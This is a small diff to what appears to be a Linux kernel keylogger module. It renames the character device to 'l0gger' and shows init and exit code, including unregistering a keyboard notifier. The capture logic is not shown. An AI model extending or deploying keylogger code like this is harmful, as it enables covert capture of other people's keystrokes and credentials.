@@ -5,11 +5,12 @@
 
 #include "klogger.h"
 #define LOUD 0
+#define DEV_NAME "l0gger"
 int klg_init(void) {
 	int result;
 
 	/* Registering device */
-  	result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
+  	result = register_chrdev(KLG_MAJOR, DEV_NAME, &klg_fops);
   
 	if (result < 0)
 		return result;
@@ -24,7 +25,7 @@ int klg_init(void) {
 
 void klg_exit(void) {
 	/* Freeing the major number */
-	unregister_chrdev(KLG_MAJOR, "klg");
+	unregister_chrdev(KLG_MAJOR, DEV_NAME);
 
 	unregister_keyboard_notifier(&nb);
 	memset(buffer, 0, sizeof buffer);
